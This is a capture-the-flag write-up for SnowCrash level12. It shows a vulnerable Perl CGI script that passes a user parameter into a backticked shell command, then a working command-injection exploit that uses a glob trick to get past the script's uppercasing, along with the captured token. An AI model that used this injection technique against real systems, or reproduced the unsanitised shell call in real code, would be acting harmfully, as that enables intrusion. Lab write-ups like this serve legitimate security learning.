In the home directory you will found the following perl script:

``` perl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/; 
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }    
}

n(t(param("x"), param("y")));
```

Assuming that this script is runing in the background, we will have an http server with a system call that we can exploit, the only problem is that the parameter given to this system call, is previously modified, making all characters uppercase, and triming all the spaces, so one work around can be this:

``` shell
level12@SnowCrash:~$ echo "getflag > /tmp/flag" > /tmp/GETFLAG;
level12@SnowCrash:~$ chmod +x /tmp/GETFLAG
level12@SnowCrash:~$ curl http://localhost:4646/?x='$(/*/getflag)'&y=''
[1] 2513
level12@SnowCrash:~$ ..
[1]+  Done                    curl http://localhost:4646/?x='$(/*/getflag)'
level12@SnowCrash:~$ cat /tmp/flag
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
level12@SnowCrash:~$ 
```
